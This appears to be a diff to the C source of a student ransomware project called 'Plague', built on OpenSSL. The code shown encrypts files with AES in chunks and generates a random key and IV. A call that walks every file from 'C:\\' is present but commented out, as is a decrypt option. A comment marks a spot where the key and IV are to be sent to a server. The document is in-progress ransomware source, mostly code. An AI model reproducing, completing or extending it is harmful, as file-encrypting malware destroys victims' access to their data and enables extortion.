@@ -14,8 +14,6 @@
 #include <openssl/rand.h>
 #include <openssl/rsa.h>
 
-// 1. Parcourir tous les fichiers d'un ordinateur
-// 2. Chiffrer un fichier en AES-256-ctr
 
 #define AES_256_KEY_SIZE 256
 
@@ -23,21 +21,13 @@ void handleError()
 {
     unsigned long errCode;
 
-    while (errCode = ERR_get_error())
+    while ((errCode = ERR_get_error()))
     {
         char *err = ERR_error_string(errCode, NULL);
         printf("%s\n", err);
     }
     abort();
 }
-
-struct ctr_state
-{
-    unsigned char ivec[AES_BLOCK_SIZE];
-    unsigned int num;
-    unsigned char ecount[AES_BLOCK_SIZE];
-};
-
 
 int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
             unsigned char *iv, unsigned char *ciphertext)
@@ -114,59 +104,46 @@ int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
     return plaintext_len;
 }
 
-void action(const char *path)
-{
-    unsigned char key[256];             /* A 256 bit key */
-    unsigned char iv[128];              /* A 128 bit IV */
+void print_file_content(const char *path) {
+    unsigned char buf[128];
+    unsigned int size;
     FILE *fd;
 
-    /* Message to be encrypted */
-    unsigned char *plaintext = (unsigned char *)"The quick brown fox jumps over the lazy dog";
-
-    if (!RAND_bytes(key, sizeof(key))) {    // Key random generation
+    if (!(fd = fopen(path, "r")))
         handleError();
+    while ((size = fread(buf, 1, sizeof(buf), fd)) > 0)
+    {
+        BIO_dump_fp (stdout, (const char *)buf, (int)size);
     }
-    if (!RAND_bytes(iv, sizeof(iv))) {      //  IV random generation
-        handleError();
-    }
+    fclose(fd);
+}
 
-    // Send key and IV to server
-
-
-
-
+void action(unsigned char key[], unsigned char iv[], const char *path)
+{
     /*
      * Buffer for ciphertext. Ensure the buffer is long enough for the
      * ciphertext which may be longer than the plaintext, depending on the
      * algorithm and mode.
      */
-    unsigned char ciphertext[128];
-    unsigned char decryptedtext[128];           /* Buffer for the decrypted text */
-    int decryptedtext_len, ciphertext_len;
+    unsigned char clear_text[128];
+    unsigned char encrypted_text[128];           /* Buffer for the decrypted text */
+    unsigned int size;
+    FILE *fd, *crypted_fd;
 
-    /* Encrypt the plaintext */
-    ciphertext_len = encrypt (plaintext, strlen((char *)plaintext), key, iv, ciphertext);
+    if (!(fd = fopen(path, "rb")))
+        handleError();
+    if (!(crypted_fd = fopen("/home/kali/CLionProjects/Plague/crypted.txt", "w")))
+        handleError();
+    while ((size = fread(clear_text, 1, sizeof(clear_text), fd)) > 0)
+    {
+        encrypt (clear_text, (int)size, key, iv, encrypted_text); // Encrypt the text
+        fwrite(encrypted_text, 1, size, crypted_fd);
+    }
+    fclose(crypted_fd);
+    fclose(fd);
 
-    /* Do something useful with the ciphertext here */
-    printf("Ciphertext is:\n");
-    BIO_dump_fp (stdout, (const char *)ciphertext, ciphertext_len);
-
-    /* Decrypt the ciphertext */
-    decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv,
-                                decryptedtext);
-
-    /* Add a NULL terminator. We are expecting printable text */
-    decryptedtext[decryptedtext_len] = '\0';
-
-    /* Show the decrypted text */
-    printf("Decrypted text is:\n");
-    printf("%s\n", decryptedtext);
-
-}
-
-void fct()
-{
-  ;
+    print_file_content(path);
+    print_file_content("/home/kali/CLionProjects/Plague/crypted.txt");
 }
 
 int in_whitelist(char *str)
@@ -218,15 +195,24 @@ void apply_for_all(const char *path)
 
 int main()
 {
-  char *path = strdup("C:\\");
-  // if not crypted yet
-  //apply_for_all(path);
-  action(path);
-  free(path);
-  system("PAUSE");
+    unsigned char key[256];             /* A 256 bit key */
+    unsigned char iv[128];              /* A 128 bit IV */
+    char *path = strdup("C:\\");
+    // if not crypted yet
+    //apply_for_all(path);
+    // if you want to decrypt it
+    //apply_for_all("/home/kali/Documents/esgi/5A/2eSemestre/projet_annuel"/*, decrypt_it*/);
 
-  // if you want to decrypt it
-  //apply_for_all("/home/kali/Documents/esgi/5A/2eSemestre/projet_annuel"/*, decrypt_it*/);
 
-  return 0;
+    if (!RAND_bytes(key, sizeof(key)))    // Key random generation
+        handleError();
+    if (!RAND_bytes(iv, sizeof(iv)))      //  IV random generation
+        handleError();
+
+    // Send key and IV to server
+
+    action(key, iv, "/home/kali/CLionProjects/Plague/decrypted.txt");
+    free(path);
+    //system("PAUSE");
+    return 0;
 }
